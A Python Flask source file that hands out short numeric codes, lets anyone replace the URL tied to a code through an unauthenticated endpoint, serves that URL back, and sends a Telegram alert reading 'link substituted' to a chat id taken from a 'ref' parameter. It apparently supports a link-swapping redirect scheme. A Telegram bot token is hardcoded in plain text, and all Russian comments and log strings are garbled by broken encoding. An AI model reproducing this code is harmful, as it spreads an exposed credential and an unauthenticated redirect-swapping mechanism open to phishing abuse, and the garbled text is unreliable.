from flask import Flask, render_template, request, jsonify, make_response
import random
from datetime import datetime, timedelta
from threading import Lock
import logging
import time
import threading
import os
from urllib.parse import urlparse, parse_qs
import requests



BASE_DIR = os.path.abspath(os.path.join(os.path.dirname(__file__)))

app = Flask(
    __name__,
    template_folder=os.path.join(BASE_DIR, 'templates'),
    static_folder=os.path.join(BASE_DIR, 'static')
)

# –•—Ä–∞–Ω–∏–ª–∏—â–µ –∫–æ–¥–æ–≤ –∏ —Å—Å—ã–ª–æ–∫
code_storage = {}
storage_lock = Lock()
CODE_EXPIRE = timedelta(minutes=2)
TELEGRAM_BOT_TOKEN = "7953140297:AAGwWVx3zwmo-9MbQ-UUU1764nljCxuncQU"
TELEGRAM_API_URL = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"

# –ù–∞—Å—Ç—Ä–æ–π–∫–∞ –ª–æ–≥–æ–≤
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO,
    handlers=[
        logging.StreamHandler()  # –ü–∏—à–µ–º –≤ stdout (–ø–æ–¥—Ö–æ–¥–∏—Ç –¥–ª—è Docker, systemd, gunicorn –∏ —Ç.–¥.)
    ]
)
logger = logging.getLogger(__name__)

def generate_unique_code():
    while True:
        code = str(random.randint(5000, 9999))
        with storage_lock:
            if code not in code_storage:
                return code


@app.route('/')
def index():
    code = generate_unique_code()
    
    with storage_lock:
        code_storage[code] = {
            'created': datetime.now(),
            'target_url': "https://ru.wikipedia.org/wiki/",
            'used': False
        }

    months = [
        "—è–Ω–≤–∞—Ä—è", "—Ñ–µ–≤—Ä–∞–ª—è", "–º–∞—Ä—Ç–∞", "–∞–ø—Ä–µ–ª—è", "–º–∞—è", "–∏—é–Ω—è",
        "–∏—é–ª—è", "–∞–≤–≥—É—Å—Ç–∞", "—Å–µ–Ω—Ç—è–±—Ä—è", "–æ–∫—Ç—è–±—Ä—è", "–Ω–æ—è–±—Ä—è", "–¥–µ–∫–∞–±—Ä—è"
    ]
    now = datetime.now()
    current_date = f"{now.day} {months[now.month - 1]} {now.year}"

    logger.info(f"–°–≥–µ–Ω–µ—Ä–∏—Ä–æ–≤–∞–Ω –Ω–æ–≤—ã–π –∫–æ–¥: {code}")
    
    response = make_response(render_template('base.html', code=code, current_date=current_date))
    response.headers['Cache-Control'] = 'no-store, no-cache, must-revalidate, max-age=0'
    response.headers['Pragma'] = 'no-cache'
    response.headers['Expires'] = '0'

    return response


@app.route('/update_code', methods=['POST'])
def update_code():
    data = request.json
    logger.info("=== –ü–æ–ª—É—á–µ–Ω –∑–∞–ø—Ä–æ—Å –Ω–∞ –æ–±–Ω–æ–≤–ª–µ–Ω–∏–µ –∫–æ–¥–∞ ===")
    logger.info(f"–í—Ö–æ–¥–Ω—ã–µ –¥–∞–Ω–Ω—ã–µ: {data}")
    
    code = data.get('code')
    new_url = data.get('new_url')
    
    if not code or not new_url:
        logger.warning("–û—à–∏–±–∫–∞: –æ—Ç—Å—É—Ç—Å—Ç–≤—É–µ—Ç –∫–æ–¥ –∏–ª–∏ URL")
        return jsonify({'status': 'error', 'message': 'Missing parameters'}), 400
    
    with storage_lock:
        logger.info(f"–¢–µ–∫—É—â–µ–µ —Ö—Ä–∞–Ω–∏–ª–∏—â–µ –∫–æ–¥–æ–≤: {code_storage}")
        if code in code_storage:
            logger.info(f"–ù–∞–π–¥–µ–Ω –∫–æ–¥ {code}. –°—Ç–∞—Ä—ã–π URL: {code_storage[code]['target_url']}")
            code_storage[code]['target_url'] = new_url
            code_storage[code]['used'] = True
            logger.info(f"–ö–æ–¥ {code} –æ–±–Ω–æ–≤–ª—ë–Ω: {code_storage[code]}")
            return jsonify({'status': 'success'})
    
    logger.error(f"–ö–æ–¥ {code} –Ω–µ –Ω–∞–π–¥–µ–Ω –≤ —Ö—Ä–∞–Ω–∏–ª–∏—â–µ")
    return jsonify({'status': 'error', 'message': 'Code not found'}), 404


@app.route('/get_target_url')
def get_target_url():
    code = request.args.get('code')
    logger.info("=== –ü–æ–ª—É—á–µ–Ω –∑–∞–ø—Ä–æ—Å –Ω–∞ –ø–æ–ª—É—á–µ–Ω–∏–µ URL ===")
    logger.info(f"–ó–∞–ø—Ä–æ—à–µ–Ω–Ω—ã–π –∫–æ–¥: {code}")
    
    if not code:
        logger.warning("–û—à–∏–±–∫–∞: –∫–æ–¥ –Ω–µ —É–∫–∞–∑–∞–Ω")
        return jsonify({'error': 'Code missing'}), 400
    
    with storage_lock:
        logger.info(f"–¢–µ–∫—É—â–µ–µ —Ö—Ä–∞–Ω–∏–ª–∏—â–µ –∫–æ–¥–æ–≤: {code_storage}")
        if code in code_storage:
            logger.info(f"URL –¥–ª—è –∫–æ–¥–∞ {code}: {code_storage[code]['target_url']}")
            return jsonify({
                'url': code_storage[code]['target_url'],
                'is_updated': code_storage[code]['used']
            })
    
    logger.warning(f"–ö–æ–¥ {code} –Ω–µ –Ω–∞–π–¥–µ–Ω. –í–æ–∑–≤—Ä–∞—â–∞–µ—Ç—Å—è URL –ø–æ —É–º–æ–ª—á–∞–Ω–∏—é.")
    return jsonify({'url': "https://ru.wikipedia.org/wiki/", 'is_updated': False})


@app.route('/notify_if_updated', methods=['POST'])
def notify_if_updated():
    logger.info("üîî –ü–æ–ª—É—á–µ–Ω –∑–∞–ø—Ä–æ—Å /notify_if_updated")

    data = request.json
    url = data.get('url')
    logger.info(f"–ü–µ—Ä–µ–¥–∞–Ω–Ω—ã–π URL: {url}")

    if not url or "ref=" not in url:
        logger.warning("‚ùå URL –æ—Ç—Å—É—Ç—Å—Ç–≤—É–µ—Ç –∏–ª–∏ –Ω–µ —Å–æ–¥–µ—Ä–∂–∏—Ç –ø–∞—Ä–∞–º–µ—Ç—Ä ref")
        return jsonify({'status': 'error', 'message': 'No ref in url'}), 400

    # –ò–∑–≤–ª–µ–∫–∞–µ–º user_id –∏–∑ ref
    parsed_url = urlparse(url)
    query_params = parse_qs(parsed_url.query)
    user_id = query_params.get('ref', [None])[0]
    logger.info(f"–ò–∑–≤–ª–µ—á—ë–Ω user_id: {user_id}")

    if not user_id:
        logger.error("‚ùå –ù–µ —É–¥–∞–ª–æ—Å—å –∏–∑–≤–ª–µ—á—å user_id –∏–∑ URL")
        return jsonify({'status': 'error', 'message': 'Invalid ref'}), 400

    # –§–æ—Ä–º–∏—Ä—É–µ–º —Å–æ–æ–±—â–µ–Ω–∏–µ
    message_text = f"üîî –°—Å—ã–ª–∫–∞ –ø–æ–¥–º–µ–Ω–µ–Ω–∞"
    payload = {
        'chat_id': user_id,
        'text': message_text
    }

    try:
        logger.info(f"–û—Ç–ø—Ä–∞–≤–∫–∞ —Å–æ–æ–±—â–µ–Ω–∏—è Telegram-–ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—é {user_id}...")
        response = requests.post(TELEGRAM_API_URL, json=payload)
        logger.info(f"–°—Ç–∞—Ç—É—Å –æ—Ç–≤–µ—Ç–∞ Telegram API: {response.status_code}")
        logger.info(f"–û—Ç–≤–µ—Ç Telegram API: {response.text}")

        if response.ok:
            logger.info("‚úÖ –°–æ–æ–±—â–µ–Ω–∏–µ —É—Å–ø–µ—à–Ω–æ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–æ")
            return jsonify({'status': 'success'})
        else:
            logger.error("‚ùå –ù–µ —É–¥–∞–ª–æ—Å—å –æ—Ç–ø—Ä–∞–≤–∏—Ç—å —Å–æ–æ–±—â–µ–Ω–∏–µ —á–µ—Ä–µ–∑ Telegram API")
            return jsonify({'status': 'error', 'message': 'Failed to send message'}), 500
    except Exception as e:
        logger.exception("üí• –û—à–∏–±–∫–∞ –ø—Ä–∏ –æ—Ç–ø—Ä–∞–≤–∫–µ —Å–æ–æ–±—â–µ–Ω–∏—è Telegram-–ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—é")
        return jsonify({'status': 'error', 'message': str(e)}), 500


def cleanup_expired_codes():
    """–û—á–∏—Å—Ç–∫–∞ —É—Å—Ç–∞—Ä–µ–≤—à–∏—Ö –∫–æ–¥–æ–≤"""
    while True:
        now = datetime.now()
        with storage_lock:
            expired = [code for code, data in code_storage.items()
                       if (now - data['created']) > CODE_EXPIRE]
            for code in expired:
                logger.info(f"–£–¥–∞–ª—ë–Ω —É—Å—Ç–∞—Ä–µ–≤—à–∏–π –∫–æ–¥: {code}")
                del code_storage[code]
        time.sleep(60)

# === –í–°–¢–ê–í–¨ –≠–¢–û –í –°–ê–ú–û–ú –ö–û–ù–¶–ï app.py ===
cleanup_thread = threading.Thread(target=cleanup_expired_codes, daemon=True)
cleanup_thread.start()
